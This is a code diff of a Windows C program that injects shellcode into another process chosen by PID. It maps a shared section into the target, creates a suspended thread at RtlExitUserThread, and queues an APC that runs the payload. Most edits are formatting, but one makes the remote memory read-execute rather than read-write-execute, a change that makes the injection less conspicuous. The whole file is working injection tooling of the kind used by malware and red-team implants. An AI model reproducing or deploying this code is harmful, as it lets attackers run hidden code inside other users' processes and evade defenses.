@@ -1,6 +1,5 @@
 #include <Windows.h>
 #include <stdio.h>
-#include <stdbool.h>
 #include <winternl.h>
 #include "definitions.h"
 
@@ -28,7 +27,6 @@ unsigned char payload[] =
 
 int main( int argc, char *argv[] )
 {
-
     /*   Check for PID argument   */
     if( argc < 2 ) {
         printf( "[*] Missing PID of remote process\n" );
@@ -49,17 +47,17 @@ int main( int argc, char *argv[] )
     NTSTATUS ntCallResult = NtOpenProcess( &hTargetProcess, PROCESS_ALL_ACCESS, &oaObjectAttributes, &cidClientId );
     if( !NT_SUCCESS( ntCallResult ) ) {
         printf( "[!] Failed to get handle to process" );
-        exit(1);
+        exit( 1 );
     }
     printf( "%-20s 0x%p\n", "hTargetProcess:", hTargetProcess );
 
     /*   Check if process is WOW64 (32-bit)   */
     ULONG isWow64 = 0;
-    UINT RetLen   = 0;
-    NtQueryInformationProcess( hTargetProcess, ProcessWow64Information, &isWow64, sizeof(isWow64), &RetLen );
+    UINT  RetLen   = 0;
+    NtQueryInformationProcess( hTargetProcess, ProcessWow64Information, &isWow64, sizeof( isWow64 ), &RetLen );
     if( !NT_SUCCESS( ntCallResult ) ) {
         printf( "[!] NtQueryInformationProcess failed with error %x\n", ntCallResult );
-        exit(1);
+        exit( 1 );
     }
     printf( "%-20s %d\n", "isWow64:", isWow64 );
 
@@ -67,45 +65,45 @@ int main( int argc, char *argv[] )
     HANDLE hSection = INVALID_HANDLE_VALUE;
     LARGE_INTEGER lnSectionSize;
     lnSectionSize.HighPart = 0;
-	lnSectionSize.LowPart = 0x1000;
+	lnSectionSize.LowPart  = 0x1000;
     ntCallResult = NtCreateSection( &hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
                                     NULL, &lnSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL );
     if( !NT_SUCCESS( ntCallResult ) ) {
         printf( "[!] NtCreateSection failed with error %x\n", ntCallResult );
-        exit(1);
+        exit( 1 );
     }
     printf( "%-20s 0x%p\n", "hSection:", hSection );
 
-    /*   Map a view of the section in the local process   */
-    PVOID lpLocalSection = NULL;
-    SIZE_T nViewSize = 0;
-    DWORD dwInheritDisposition = 1;
+    /*   Map a RW view of the section in the local process   */
+    PVOID  lpLocalSection       = NULL;
+    SIZE_T nViewSize            = 0;
+    DWORD  dwInheritDisposition = 1;
     ntCallResult = NtMapViewOfSection( hSection, INVALID_HANDLE_VALUE, &lpLocalSection, (ULONG_PTR)NULL, 0, NULL,
                                        &nViewSize, dwInheritDisposition, 0, PAGE_READWRITE );
     if( !NT_SUCCESS( ntCallResult ) ) {
         printf( "[!] NtMapViewOfSection failed with error %x\n", ntCallResult );
-        exit(1);
+        exit( 1 );
     }
     printf( "%-20s 0x%p\n", "lpLocalSection:", lpLocalSection );
 
-    /*   Copy payload to local view, which will be reflected in remote process's mapped view   */
+    /*   Copy shellcode to local section view, which will be reflected in remote process's mapped view   */
     memcpy( lpLocalSection, payload, sizeof( payload ) );
 
-    /*   Map a view of the section in the remote process   */
+    /*   Map a RX view of the section in the remote process   */
     PVOID lpRemoteSection = NULL;
     ntCallResult = NtMapViewOfSection( hSection, hTargetProcess, &lpRemoteSection, (ULONG_PTR)NULL, 0, NULL, &nViewSize, 
-                                       dwInheritDisposition, 0, PAGE_EXECUTE_READWRITE );
+                                       dwInheritDisposition, 0, PAGE_EXECUTE_READ );
     if( !NT_SUCCESS( ntCallResult ) ) {
         printf( "[!] NtMapViewOfSection failed with error %x\n", ntCallResult );
-        exit(1);
+        exit( 1 );
     }                        
     printf( "%-20s 0x%p\n", "lpRemoteSection:", lpRemoteSection );
 
-    /*   Unmap the local section since we're done with it   */
+    /*   Unmap the local section view since we're done with it   */
     ntCallResult = NtUnmapViewOfSection( INVALID_HANDLE_VALUE, lpLocalSection );
     if( !NT_SUCCESS( ntCallResult ) ) {
         printf( "[!] NtUnmapViewOfSection failed with error %x\n", ntCallResult );
-        exit(1);
+        exit( 1 );
     } 
 
     HANDLE hModule = INVALID_HANDLE_VALUE;
@@ -113,31 +111,31 @@ int main( int argc, char *argv[] )
     ANSI_STRING aFuncName;
     PVOID pRemoteFunction = NULL;
 
-    /*   Create Unicode string for function call   */
+    /*   Create Unicode string for LdrGetDllHandle call   */
     RtlInitUnicodeString( &uModuleName, L"ntdll.dll" );
 
     /*   Get handle to ntdll.dll   */
     ntCallResult = LdrGetDllHandle( NULL, NULL, &uModuleName, &hModule );
     printf( "%-20s 0x%p\n", "hModule:", hModule );
-    
-    /*   Create an ANSI string for LdrGetProcedureAddress call   */
+
+    /*   Create ANSI string for LdrGetProcedureAddress call   */
     RtlInitAnsiString( &aFuncName, "RtlExitUserThread" );
 
     /*   Get the address of RtlExitUserThread (same in both local and remote process)   */
     ntCallResult = LdrGetProcedureAddress( hModule,  &aFuncName, 0, &pRemoteFunction );
     if( !NT_SUCCESS( ntCallResult ) ) {
         printf( "[!] LdrGetProcedureAddress failed with error %x\n", ntCallResult );
-        exit(1);
+        exit( 1 );
     }  
     printf( "%-20s 0x%p\n", "pRemoteFunction:", pRemoteFunction );
 
-    /*   Create a remote thread at the remote address of RtlExitUserThread   */
+    /*   Create a remote thread at the address of RtlExitUserThread   */
     HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
     ntCallResult = NtCreateThreadEx( &hRemoteThread, STANDARD_RIGHTS_ALL | SPECIFIC_RIGHTS_ALL, NULL, hTargetProcess, 
                                      (LPTHREAD_START_ROUTINE)pRemoteFunction, NULL, true, 0, 0xffff, 0xffff, NULL );
     if( !NT_SUCCESS( ntCallResult ) ) {
         printf( "[!] NtCreateThreadEx failed with error %x\n", ntCallResult );
-        exit(1);
+        exit( 1 );
     }    
     printf( "%-20s 0x%p\n", "hRemoteThread:", hRemoteThread );
 
@@ -145,15 +143,14 @@ int main( int argc, char *argv[] )
     ntCallResult = NtQueueApcThread( hRemoteThread, (PIO_APC_ROUTINE)lpRemoteSection, NULL, NULL, (ULONG_PTR)NULL );
     if( !NT_SUCCESS( ntCallResult ) ) {
         printf( "[!] NtQueueApcThread failed with error %x\n", ntCallResult );
-        exit(1);
+        exit( 1 );
     }
 
     /*   Alert the thread to begin execution   */
-    UINT SuspendCount = 0;
-    ntCallResult = NtAlertResumeThread( hRemoteThread, &SuspendCount );
+    ntCallResult = NtAlertResumeThread( hRemoteThread, NULL );
     if( !NT_SUCCESS( ntCallResult ) ) {
         printf( "[!] NtAlertResumeThread failed with error %x\n", ntCallResult );
-        exit(1);
+        exit( 1 );
     }
 
     return 0;
